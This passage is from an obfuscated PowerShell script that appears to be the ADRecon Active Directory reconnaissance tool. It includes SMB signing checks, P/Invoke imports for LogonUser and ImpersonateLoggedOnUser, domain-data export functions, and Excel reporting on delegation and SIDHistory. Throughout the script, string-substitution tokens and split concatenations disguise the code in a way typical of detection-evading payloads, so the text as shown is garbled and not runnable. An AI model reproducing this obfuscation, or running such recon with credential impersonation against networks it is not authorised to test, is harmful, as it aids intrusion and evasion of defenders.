				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0210, true);
			}
			else if (SMBv2_0x0202)
			{
				SMBSigning = DoesServerSupportDialectWithSmbV2(computer, 0x0202, true);
			}
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB Port OpenI2aj, isPortOpened));
            DCSMBObj.Members.Add(new PSNotePrope'+'rty(I2ajSMB1(NT LM 0.12)I2aj, SMBv1));
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0202)I2aj, SMBv2_0x0202));
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB2(0x0210)I2aj, SMBv2_0x0210));
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0300)I2aj, SMBv3_0x0300));
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0302)I2aj, SMBv3_0x0302));
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB3(0x0311)I2aj, SMBv3_0x0311));
            DCSMBObj.Members.Add(new PSNoteProperty(I2ajSMB SigningI2aj, SMBSigning));
            return DCSMBObj;
		}
	}
}
I2aj@







5I7ELAdvapi32Def = @JQTOy
    [DllImport(I2ajadvapi32.dllI2aj, SetLastError = true)]
    public static extern bool LogonUser(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport(I2ajadvapi32.dllI2aj, SetLastError = true)]
    public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport(I2ajadvapi32.dllI2aj, SetLastError = true)]
    public static extern bool RevertToSelf();
JQTOy@



5I7ELKernel32Def = @JQTOy
    [DllImport(I2ajkernel32.dllI2aj, SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
JQTOy@

Function Get-DateDiff
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [DateTime] 5I7ELDate1,

        [Parameter(Mandatory = 5I7ELtrue)]
        [DateTime] 5I7ELDate2
    )

    If (5I7ELDate2 -gt 5I7ELDate1)
    {
        5I7ELDDiff = 5I7ELDate2 - 5I7ELDate1
    }
    Else
    {
        5I7ELDDiff = 5I7ELDate1 - 5I7ELDate2
    }
    Return 5I7ELDDiff
}

Function Get-DNtoFQDN
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADObjectDN
    )

    5I7ELIndex = 5I7ELADObjectDN.IndexOf(JQTOyDC=JQTOy)
    If (5I7ELIndex)
    {
        5I7ELADObjectDNDomainName = 5I7EL(5I7ELADObjectDN.SubString(5I7ELIndex)) -replace JQTOyDC=JQTOy,JQTOyJQTOy -replace JQTOy,JQTOy,JQTOy.JQTOy
    }
    Else
    {
        
        [array] 5I7ELADObjectDNArray = 5I7ELADObjectDN -Split (I2ajDC=I2aj)
        5I7ELADObjectDNArray Ok6rl ForEach-Object {
            [array] 5I7ELtemp = 5I7EL_ -Split (I2aj,I2aj)
            [string] 5I7ELADObjectDNArrayItemDomainName += 5I7ELtemp[0'+'] + I2aj.I2aj
        }
        5I7ELADObjectDNDomainName = 5I7ELADObjectDNArrayItemDomainName.Substring(1, 5I7ELADObjectDNArrayItemDomainName.Length - 2)
    }
    Return 5I7ELADObjectDNDomainName
}

Function Export-ADRCSV
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] 5I7ELADRObj,

        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [String] 5I7ELADFileName
    )

    Try
    {
        5I7ELADRObj Ok6rl Export-Csv -Path 5I7ELADFileName -NoTypeInformation -Encoding Default
    }
    Catch
    {
        Write-Warning I2aj[Export-ADRCSV] Failed to export 5I7EL(5I7ELADFileName).I2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
    }
}

Function Export-ADRXML
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] 5I7ELADRObj,

        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [String] 5I7ELADFileName
    )

    Try
    {
        (ConvertTo-Xml -NoTypeInformation -InputObject 5I7ELADRObj).Save(5I7ELADFileName)
    }
    Catch
    {
        Write-Warning I2aj[Export-ADRXML'+'] Failed to export 5I7EL(5I7ELADFileName).I2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Messag'+'e)I2aj
    }
}

Function Export-ADRJSON
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] 5I7ELADRObj,

        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [String] 5I7ELADFil'+'eName
    )

    Try
    {
        ConvertTo-JSON -InputObject 5I7ELADRObj Ok6rl Out-File -FilePath 5I7ELADFileName
    }
    Catch
    {
        Write-Warning I2aj[Export-ADRJSON] Failed to export 5I7EL(5I7ELADFileName).I2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
    }
}

Function Export-ADRHTML
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [PSObject] 5I7ELADRObj,

        [Parameter(Mandatory = 5I7ELtrue)]
        [ValidateNotNullOrEmpty()]
        [String] 5I7ELADFileName,

        [Parameter(Mandatory = 5I7ELfalse)]
        [String] 5I7ELADROutputDir = 5I7ELnull
    )

5I7ELHeader = @I2aj
<style type=I2ajtext/cssI2aj>
th {
	color:white;
	back'+'ground-color:blue;
}
td, th {
	border:0px solid black;
	border-collapse:'+'collapse;
	white-space:pre;
}
tr:nth-child(2n+1) {
    background-color: #dddddd;
}
tr:hover td {
    background-color: #c1d5f8;
}
table, tr, td, th {
	padding: 0px;
	margin: 0px;
	white-space:pre;
}
table {
	margin-left:1px;
}
</style>
I2aj@
    Try
    {
        If (5I7ELADFileName.Contains(I2ajIndexI2aj))
        {
            5I7ELHTMLPath  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyHTML-FilesJQTOy)
            5I7ELHTMLPath = 5I7EL((Convert-Path 5I7ELHTMLPath).TrimEnd(I2ajCOlhgI2aj))
            5I7ELHTMLFiles = Get-ChildItem -Path 5I7ELHTMLPath -name
            5I7ELHTML = 5I7ELHTMLFiles Ok6rl ConvertTo-HTML -Title I2ajADReconI2aj -Property @{Label=I2ajTable of ContentsI2aj;Expression={I2aj<a href=JQTOy5I7EL(5I7EL_)JQTOy>5I7EL(5I7EL_)</a>I2aj}} -Head 5I7ELHeader

            Add-Type -AssemblyName System.Web
            [System.Web.HttpUtility]::HtmlDecode(5I7ELHTML) Ok6rl Out-File -FilePath 5I7ELADFileName
        }
        Else
        {
            If (5I7ELADRObj -is [array])
            {
                5I7ELADRObj Ok6rl Select-Object * Ok6rl ConvertTo-HTML -As Table -Head 5I7ELHeader Ok6rl Out-File -FilePath 5I7ELADFileName
            }
            Else
            {
                ConvertTo-HTML -InputObject 5I7ELADRObj -As Table -Head 5I7ELHeader Ok6rl Out-File -FilePath 5I7ELADFileName
            }
        }
    }
    Catch
    {
        Write-Warning I2aj[Export-ADRHTML] Failed to export 5I7EL(5I7ELADFileName).I2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2'+'aj
    }
}

Function Export-ADR
{

    param(
        [Parameter(Mandatory = 5I7ELtrue'+')]
        [PSObject] 5I7ELADRObj,

        [Parameter(Mandatory = 5I7ELtrue)]
        [String] 5I7ELADROutputDir,

        [Parameter(Mandatory = 5I7ELtrue)]
        [array] 5I7ELOutputType,

        [Parameter(Mandatory = 5I7ELtrue)]
        [String] 5I7ELADRModuleName
    )

    Switch (5I7ELOutputType)
    {
        JQTOySTDOUTJQTOy
        {
            If (5I7ELADRModuleName -ne I2ajAboutADReconI2aj)
            {
                If (5I7ELADRObj -is [array])
                {
       '+'             
                    5I7ELADRObj Ok6rl Out-String -Stream
                }
                Else
                {
                    
                    5I7ELADRObj Ok6rl Format-List Ok6rl Out-String -Stream
                }
            }
        }
        JQTOyCSVJQTOy
        {
            5I7ELADFileName  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyCSV-FilesJQTOy,JQTOyCOlhgJQTOy,5I7ELADRModuleName,JQTOy.csvJQTOy)
            Export-ADRCSV -ADRObj 5I7ELADRObj -ADFileName 5I7ELADFileName
        }
        JQTOyXMLJQTOy
        {
            5I7ELADFileName  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyXML-FilesJQTOy,JQTOyCOlhgJQTOy,5I7ELADRModuleName,JQTOy.xmlJQTOy)
            Export-ADRXML -ADRObj 5I7ELADRObj -ADFileName 5I7ELADFileName
        }
        JQTOyJSONJQTOy
        {
            5I7ELADFileName  = -join(5I7ELADROutputDir,JQ'+'TOyCOlhgJQTOy,JQTOyJSON-FilesJQTOy,JQTOyCOlhgJQTOy,5I7ELADRModuleName,JQTOy.jsonJQTOy)
            Export-ADRJSON -ADRObj 5I7ELADRObj -ADFileName 5I7ELADFileName
        }
        JQTOyHTMLJQTOy
        {
            5I7ELADFileName  = -join(5I7ELADROutputDir,JQTOyCOlhgJQTOy,JQTOyHTML-FilesJQTOy,JQTOyCOlhgJQTOy,5I7ELADRModuleName,JQTOy.htmlJQTOy)
            Export-ADRHTML -ADRObj 5I7ELADRObj -ADFileName 5I7ELADFileName -ADROutputDir 5I7ELADROutputD'+'ir
        }
    }
}

Function Get-ADRExcelComObj
{


    
    Try
    {
        
        5I7ELSaveVerbosePreference = 5I7ELscript:VerbosePreference
        5I7ELscript:VerbosePreference = JQTOySilentlyContinueJQTOy
        5I7ELglobal:excel = New-Object -ComObject excel.application
        If (5I7ELSaveVerbosePreference)
        {
            5I7ELscript:VerbosePreference = 5I7ELSaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
    }
    Catch
    {
        If (5I7ELSaveVerbosePreference)
        {
            5I7ELscript:VerbosePreference = 5I7ELSaveVerbosePreference
            Remove-Variable SaveVerbosePreference
        }
        Write-Warning I2aj[Get-ADRExcelComObj] Excel does not appear to be installed. Skipping generation of ADRecon-Report.xlsx. Use the -GenExcel parameter to generate the ADRecon-Report.x'+'slx on a host with Microsoft Excel installed.I2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
        Return 5I7ELnull
    }
    5I7ELexcel.Visible = 5I7ELtrue
    5I7ELexcel.Interactive = 5I7ELfalse
    5I7ELglobal:workbook = 5I7ELexcel.Workbooks.Add()
    If (5I7ELworkbook.Worksheets.Count -eq 3)
    {
        5I7ELworkbook.WorkSheets.Item(3).Delete()
        5I7ELworkbook.WorkSheets.Item(2).Delete()
    }
}

Function Get-ADRExcelComObjRelease
{

    param(
        [Parameter(Mandatory = 5I7ELtrue)]
        5I7ELComObjtoRelease,

        [Parameter(Mandatory = 5I7ELfalse)]
        [bool] 5I7ELFinal = 5I7ELfalse
    )
    
    
    If (5I7ELFinal)
    {
        [System.Runtime.InteropServices.Marshal]::FinalReleaseComObject(5I7ELComObjtoRelease) Ok6rl Out-Null
    }
    Else
    {
        [System.Runtime.InteropServices.Marshal]::ReleaseComObject(5I7ELComObjtoRelease) Ok6rl Out-Null
    }
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}

Function Get-ADRExcelWorkbook
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELname
    )

    5I7ELworkbook.Worksheets.Add() Ok6rl Out-Null
    5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
    5I7ELworksheet.Name = 5I7ELname

    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelImport
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELADFileName,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELMethod = 1,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELrow = 1,

        [Parameter(Mandatory = 5I7ELfalse)]
        [int] 5I7ELcolumn = 1
    )

    5I7ELexcel.ScreenUpdating = 5I7ELfalse
    If (5I7ELMethod -eq 1)
    {
        If (Test-Path 5I7ELADFileName)
        {
            5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
            5I7ELTxtConnector = (I2ajTEXT;I2aj + 5I7ELADFileName)
            5I7ELCellRef = 5I7ELworksheet.Range(I2ajA1I2aj)
            
            5I7ELConnector = 5I7ELworksheet.Query'+'Tables.add(5I7ELTxtConnector, 5I7ELCellRef)

            
            5I7ELworksheet.QueryTables.item(5I7ELConnector.name).TextFilePlatform = 65001
            5I7ELworksheet.QueryTables.item(5I7ELConnector.name).TextFileCommaDelimiter = 5I7ELTrue
            5I7ELworksheet.QueryTables.item(5I7ELConnector.name).TextFileParseType = 1
            5I7ELworksheet.QueryTables.item(5I7ELConnector.name).Refresh() Ok6rl Out-Null
            5I7ELworksheet.QueryTables.item(5I7ELConnector.name).delete()

            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELCellRef
            Remove-Variable CellRef
            Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELConnector
            Remove-Variable Connector

            5I7ELlistObject = 5I7ELworksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, 5I7ELworksheet.UsedRange, 5I7ELnull, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, 5I7ELnull)
            5I7ELlistObject.TableStyle = I2ajTableStyleLight2I2aj 
            5I7ELworksheet.UsedRange.EntireColumn.AutoFit() Ok6rl Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif (5I7ELMethod -eq 2)
    {
        5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
        If (Test-Path 5I7ELADFileName)
        {
            5I7ELADTemp = Import-Csv -Path 5I7ELADFileName
            5I7ELADTemp Ok6rl ForEach-Object {
                Foreach (5I7ELprop in 5I7EL_.PSObject.Properties)
                {
                    5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = 5I7ELprop.Name
                    5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn + 1) = 5I7ELprop.Value
                    5I7ELrow++
                }
            }
            Remove-Variable ADTemp
            5I7ELlistObject = 5I7ELworksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, 5I7ELworksheet.UsedRange, 5I7ELnull, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, 5I7ELnull)
            5I7ELlistObject.TableStyle = I2ajTableStyleLight2I2aj 
            5I7ELusedRange = 5I7ELworksheet.UsedRange
            5I7ELusedRange.EntireColumn.AutoFit() Ok6rl Out-Null
        }
        Else
        {
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = I2ajError!I2aj
        }
        Remove-Variable ADFileName
    }
    5I7ELexcel.ScreenUpdating = 5I7ELtrue

    Get-ADRExcelComObjReleas'+'e -ComObjtoRelease 5I7ELworksheet
    Remove-Variable worksheet
}


Function Get-ADRExcelPivotTable
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELSrcSheetName,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELPivotTableName,

        [Parameter(Mandatory = 5I7ELfalse)]
        [array] 5I7ELPivotRows,

        [Parameter(Mandatory = 5I7ELfalse)]
        [array] 5I7ELPivotColumns,

        [Parameter(Mandatory = 5I7ELfalse)]
        [array] 5I7ELPivotFilters,

        [Parameter(Mandatory = 5I7ELfalse)]
        [array] 5I7ELPivotValues,

        [Parameter(Mandatory = 5I7ELfalse)]
        [array] 5I7ELPivotPercentage,

        [Parameter(Mandatory = 5I7ELfalse)]
        [string] 5I7ELPivotLocation = I2ajR1C1I2aj
    )

    5I7ELexcel.ScreenUpdating = 5I7ELfalse
    5I7ELSrcWorksheet = 5I7ELworkbook.Sheets.Item(5I7ELSrcSheetName)
    5I7ELworkbook.ShowPivotTableFieldList = 5I7ELfalse

    
    
    
    
    
    

    
    
    5I7ELPivotFailed = 5I7ELfalse
    Try
    {
        5I7ELPivotCaches = 5I7ELworkbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, 5I7ELSrcWorksheet.UsedRange'+', [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotT'+'ableVersion12)
    }
    Catch
    {
        5I7ELPivotFailed = 5I7ELtrue
        Write-Verbose I2aj[PivotCaches().Create] FailedI2aj
        Write-Verbose I2aj[EXCEPTION] 5I7EL(5I7EL_.Exception.Message)I2aj
    }
    If ( 5I7ELPivotFailed -eq 5I7ELtrue )
    {
        5I7ELrows = 5I7ELSrcWorksheet.UsedRange.Rows.Count
   '+'     If (5I7ELSrcSheetName -eq I2ajComputer SPNsI2aj)
        {
            5I7ELPivotCols = I2ajA1:CI2aj
        }
        ElseIf (5I7ELSrcSheetName -eq I2a'+'jComputersI2aj)
        {
            5I7ELPivotCols = I2ajA1:FI2aj
        }
        ElseIf (5I7ELSrcSheetName -eq I2ajUsersI2aj)
        {
            5I7ELPivotCols = I2ajA1:CI2aj
        }
        5I7ELUsedRange = 5I7ELSrcWorksheet.Range(5I7ELPivotCols+5I7ELrows)
        5I7ELPivotCaches = 5I7ELworkbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, 5I7ELUsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
        Remove-Variable rows
	    Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
    5I7ELPivotTable = 5I7ELPivotCaches.CreatePivotTable(5I7ELPivotLocation,5I7ELPivotTableName)
    

    If (5I7ELPivotRows)
    {
        ForEach (5I7ELRow in 5I7ELPivotRows)
        {
            5I7ELPivotField = 5I7ELPivotTable.PivotFields(5I7ELRow)
            5I7ELPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlRowField
        }
    }

    If (5I7ELPivotColumns)
    {
        ForEach (5I7ELCol in 5I7ELPivotColumns)
        {
            5I7ELPivotField = 5I7ELPivotTable.PivotFields(5I7ELCol)
            5I7ELPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlColumnField
    '+'    }
    }

    If (5I7ELPivotFilters)
    {
        ForEach (5I7ELFil in 5I7ELPivotFilters)
        {
            5I7ELPivotField = 5I7ELPivotTable.PivotFields(5I7ELFil)
            5I7ELPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
        }
    }

    If (5I7ELPivotValues)
    {
        ForEach (5I7ELVal in 5I7ELPivotValues)
        {
            5I7ELPivotField = 5I7ELPivotTable.PivotFields(5I7ELVal)
            5I7ELPivotField.Orientation = [Micr'+'osoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
        }
    }

    If (5I7ELPivotPercentage)
    {
        ForEach (5I7ELVal in 5I7ELPivotPercentage)
        {
            5I7ELPivotField = 5I7ELPivotTable.PivotFields(5I7ELVal)
            5I7ELPivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
            5I7ELPivotField.Calculation = [Microsoft.Office.Interop.Excel.XlPivotFieldCalculation]::xlPercentOfTotal
            5I7ELPivotTable.ShowValuesRow = 5I7ELfalse
        }
    }

    
    5I7ELexcel.ScreenUpdating = 5I7ELtrue

    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELPivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELPivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELPivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -Co'+'mObjtoRelease 5I7ELSrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELSrcSheetName,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELTitle1,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELPivotTableName,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string]'+' 5I7ELPivotRows,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELPivotValues,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELPivotPercentage,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELTitle2,

        [Parameter(Mandatory = 5I7ELtrue)]
        [System.Object] 5I7ELObjAttributes
    )

    5I7ELexcel.ScreenUpdating = 5I7ELfalse
    5I7ELworksheet = 5I7ELworkbook.Worksheets.Item(1)
    5I7ELSrcWorksheet = 5I7ELworkbook.Sheets.Item(5I7ELSrcSheetName)

    5I7ELrow = 1
    5I7ELcolumn = 1
    5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = 5I7ELTitle1
    5I7ELworksheet.Cells.Item(5I7ELrow,5I7ELcolumn).Style = I2ajHeading 2I2aj
    5I7ELworksheet.Cells.Item(5I7ELrow,5I7ELcolumn).HorizontalAlignment = -4108
    5I7ELMergeCells = 5I7ELworksheet.Range(I2ajA1:C1I2aj)
    5I7ELMergeCells.Select() Ok6rl Out-Null
    5I7ELMergeCells.MergeCells = 5I7ELtrue
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName 5I7ELSrcSheetName -PivotTableName 5I7ELPivotTableName -PivotRows @(5I7ELPivotRows) -PivotValues @(5I7ELPivotValues) -PivotPercentage @(5I7ELPivotPercentage) -PivotLocation I2ajR2C1I2aj
    5I7ELexcel.ScreenUpdating = 5I7ELfalse

    5I7ELrow = 2
    I2ajTypeI2aj,I2ajCountI2aj,I2ajPercentageI2aj Ok6rl ForEach-Object {
        5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = 5I7EL_
        5'+'I7ELwo'+'rksheet.Cells.Item(5I7ELrow, 5I7ELcolumn).Font.Bold = 5I7ELTrue
        5I7ELcolumn++
    }

    5I7ELrow = 3
    5I7ELcolumn = 1
    For(5I7ELrow = 3; 5I7ELrow -le 6; 5I7ELrow++)
    {
        5I7ELtemptext = [string] 5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn).Text
        switch (5I7ELtemptext.ToUpper())
        {
            I2a'+'jTRUEI2aj { 5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = I2ajEnabledI2aj }
            I2ajFALSEI2aj { 5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = I2ajDisabledI2aj }
            I2ajGRAND TOTALI2aj { 5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = I2ajTotalI2aj }
        }
    }

    If (5I7ELObjAttributes)
    {
        5I7ELrow = 1
        5I7ELcolumn = 6
        5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = 5I7ELTitle2
        5I7ELworksheet.Cells.Item(5I7ELrow,5I7ELcolumn).Style = I2ajHeading 2I2aj
        5I7ELworksheet.Cells.Item(5I7ELrow,5I7ELcolumn).HorizontalAlignment = -4108
        5I7ELMergeCells = 5I7ELw'+'orksheet.Range(I2ajF1:L1I2aj)
        5I7ELMergeCells.Select() Ok6rl Out-Null
        5I7ELMergeCells.MergeCells = 5I7ELtrue
        Remove-Variable MergeCells

        5I7ELrow++'+'
        I2ajCategoryI2aj,I2ajEnabled CountI2aj,I2ajEnabled PercentageI2aj,I2ajDisabled CountI2aj,I2ajDisabled PercentageI2aj,I2ajTotal CountI2aj,I2ajTotal PercentageI2aj Ok6rl ForEach-Object {
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = 5I7EL_
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn).Font.Bold = 5I7ELTrue
            5I7EL'+'column++
        }
        5I7ELExcelColumn = (5I7ELSrcWorksheet.Columns.Find(I2ajEnabledI2aj))
        5I7ELEnabledColAddress = I2aj5I7EL(5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse).Substring(0,5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse).Length-1)):5I7EL(5I7ELExce'+'lColumn.Address(5I7ELfalse,5I7ELfalse).Substring(0,5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse).Length-1))I2aj
        5I7ELcolumn = 6
        5I7ELi = 2

        5I7ELObjAttributes.keys Ok6rl ForEach-Object {
            5I7ELExcelColumn = (5I7ELSrcWorksheet.Columns.Find(5I7EL_))
            5I7ELColAddre'+'ss = I2aj5I7EL(5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse).Substring(0,5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse).Length-1)):5I7EL(5I7ELExcelColumn.Address(5I7ELfa'+'lse,5I7ELfalse).Substring(0,5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse).Length-1))I2aj
            5I7ELrow++
            5I7ELi++
            If (5I7EL_ -eq I2ajDelegation TypI2aj)
            {
                5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = I2ajUnconstrained DelegationI2aj
            }
            ElseIf (5I7EL_ -eq I2ajDelegation TypeI2aj)
            {
                5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn) = I2ajConstrained DelegationI2aj
            }
            Else
            {
                5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn).Formula = I2aj=JQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELExcelColumn.Address(5I7ELfalse,5I7ELfalse)
            }
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+1).Formula = I2aj=COUNTIFS(JQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELEnabledColAddress + JQTOy,I2ajTRUEI2aj,JQTOy + I2ajJQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELColA'+'ddress + JQTOy,JQTOy + 5I7ELObjAttributes[5I7EL_] + JQTOy)JQTOy
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+2).Formula = JQTOy=IFERROR(GJQTOy + 5I7ELi + JQTOy/VLOOKUP(I2ajEnabledI2aj,A3:B6,2,FAL'+'SE),0)JQTOy
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+3).Formula = I2aj=COUNTIFS(JQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELEnabledColAddress + JQTOy,I2ajFALSEI2aj,JQTOy + I2ajJQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELColAddress + JQTOy,JQTOy + 5I7ELObjAttributes[5I7EL_] + JQTOy)JQTOy
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+4).Formula = JQTOy=IFERROR(IJQTOy + 5I7ELi + JQTOy/VLOOKUP(I2ajDisabledI2aj,A3:B6,2,FALSE),0)JQTOy
            If ( (5I7EL_ -eq I2ajSIDHistoryI2aj) -or (5I7EL_ -eq I2ajms-ds-CreatorSidI2aj) )
            {
                
                5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+5).Formula = I2aj=COUNTIF(JQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELColAddress + JQTOy,JQTOy + 5I7ELObjAttributes[5I7EL_] + JQTOy)-1JQTOy
            }
            Else
            {
                5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+5).Formula = I2aj=COUNTIF(JQTOyI2aj + 5I7ELSrcWorksheet.Name + I2ajJQTOy!I2aj + 5I7ELColAddress + JQTOy,JQTOy + 5I7ELObjAttributes[5I7EL_] + JQTOy)JQTOy
            }
            5I7ELworksheet.Cells.Item(5I7ELrow, 5I7ELcolumn+6).Formula = JQTOy=IFERROR(KJQTOy + 5I7ELi + JQTOy/VLOOKUP(I2ajTotalI2aj,A3:B6,2,FALSE),0)JQTOy
        }

        
        I2ajHI2aj, I2ajJI2aj , I2ajLI2aj Ok6rl ForEach-Object {
            5I7ELrng = 5I7EL_ + 5I7EL(5I7ELrow - 5I7ELObjAttributes.Count + 1) + I2aj:I2aj + 5I7EL_ + 5I7EL(5I7ELrow)
            5I7ELworksheet.Range(5I7ELrng).NumberFormat = I2aj0.00%I2aj
        }
    }
    5I7ELexcel.ScreenUpdating = 5I7ELtrue

    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELSrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease 5I7ELworksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{

    param (
        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELChartType,

        [Parameter(Mandatory = 5I7ELtrue)]
        [int] 5I7ELChartLayout,

        [Parameter(Mandatory = 5I7ELtrue)]
        [string] 5I7ELChartTitle,

        [Parameter(Mandatory = 5I7ELtrue)]
        5I7ELRangetoCover,

        [Parameter(Mandatory = 5I7ELfalse)]
        5I7ELChartData = 5I7ELnull,

        [Parameter(Mandatory = 5I7ELfalse)]
        5I7ELStartRow = 5I7ELnull,

        [Parameter(Mandatory = 5I7ELfalse)]
        5I7ELStartColumn = 5I7ELnull
    )

    5I7ELexcel.ScreenUpdating = 5I7ELfalse
    5I7ELexcel.DisplayAlerts = 5I7ELfalse
